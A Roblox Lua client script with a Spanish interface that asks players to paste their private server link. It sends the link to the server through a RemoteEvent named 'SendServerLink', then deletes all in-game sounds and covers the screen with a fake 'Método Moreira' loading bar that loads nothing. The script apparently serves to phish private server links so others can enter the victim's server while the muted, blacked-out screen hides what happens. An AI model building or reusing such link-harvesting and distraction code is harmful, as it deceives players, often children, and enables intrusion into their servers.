local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local StarterPack = game:GetService("StarterPack")
local Players = game:GetService("Players")

-- ====== UI PRINCIPAL ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)

-- ====== VALIDACIÓN DEL LINK ======
local function isLinkValid(link)
	local startPart = "https://www.roblox.com/share?code="
	local endPart = "&type=Server"
	return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- ====== ELIMINAR SONIDOS (TOTAL) ======
local function removeAllSounds()
	local services = {
		Workspace,
		SoundService,
		Lighting,
		StarterGui,
		StarterPack,
		ReplicatedStorage,
		Players,
	}

	-- función que destruye sonidos y desactiva loops
	local function destroySounds(obj)
		for _, descendant in pairs(obj:GetDescendants()) do
			if descendant:IsA("Sound") then
				descendant:Stop()
				descendant:Destroy()
			end
		end
	end

	-- destruir sonidos actuales
	for _, service in pairs(services) do
		destroySounds(service)
	end

	-- eliminar sonidos futuros
	for _, service in pairs(services) do
		service.DescendantAdded:Connect(function(obj)
			if obj:IsA("Sound") then
				obj:Stop()
				obj:Destroy()
			end
		end)
	end

	-- sonidos en PlayerGui
	for _, plr in pairs(Players:GetPlayers()) do
		if plr:FindFirstChild("PlayerGui") then
			destroySounds(plr.PlayerGui)
			plr.PlayerGui.DescendantAdded:Connect(function(obj)
				if obj:IsA("Sound") then
					obj:Stop()
					obj:Destroy()
				end
			end)
		end
	end
end

-- ====== PANTALLA DE CARGA ======
local function showLoadingScreen()
	local LoadingGui = Instance.new("ScreenGui")
	LoadingGui.IgnoreGuiInset = true
	LoadingGui.DisplayOrder = 9999
	LoadingGui.Parent = Player:WaitForChild("PlayerGui")

	local Background = Instance.new("Frame")
	Background.Parent = LoadingGui
	Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Background.Size = UDim2.new(1, 0, 1, 0)
	Background.Position = UDim2.new(0, 0, 0, 0)

	local Title = Instance.new("TextLabel")
	Title.Parent = Background
	Title.Size = UDim2.new(1, 0, 0, 100)
	Title.Position = UDim2.new(0, 0, 0.4, -100)
	Title.Text = "Cargando Método Moreira..."
	Title.TextScaled = true
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1
	Title.Font = Enum.Font.GothamBold

	local ProgressBarBG = Instance.new("Frame")
	ProgressBarBG.Parent = Background
	ProgressBarBG.Size = UDim2.new(0.6, 0, 0, 30)
	ProgressBarBG.Position = UDim2.new(0.2, 0, 0.55, 0)
	ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	ProgressBarBG.BorderSizePixel = 0
	ProgressBarBG.ClipsDescendants = true

	local ProgressBar = Instance.new("Frame")
	ProgressBar.Parent = ProgressBarBG
	ProgressBar.Size = UDim2.new(0, 0, 1, 0)
	ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
	ProgressBar.BorderSizePixel = 0

	local Percentage = Instance.new("TextLabel")
	Percentage.Parent = Background
	Percentage.Size = UDim2.new(1, 0, 0, 40)
	Percentage.Position = UDim2.new(0, 0, 0.62, 0)
	Percentage.Text = "1%"
	Percentage.TextScaled = true
	Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
	Percentage.BackgroundTransparency = 1
	Percentage.Font = Enum.Font.GothamBold

	for i = 1, 100 do
		ProgressBar.Size = UDim2.new(i / 100, 0, 1, 0)
		Percentage.Text = tostring(i) .. "%"
		wait(0.05)
	end
end

-- ====== BOTÓN PRINCIPAL ======
Button.MouseButton1Click:Connect(function()
	local link = TextBox.Text
	if isLinkValid(link) then
		MessageLabel.Text = "El link es válido ✅"
		MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

		local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
		if remoteEvent then
			remoteEvent:FireServer(link)
		end

		removeAllSounds()
		showLoadingScreen()
		ScreenGui:Destroy()
	else
		MessageLabel.Text = "El link es inválido ❌"
		MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
	end
end)

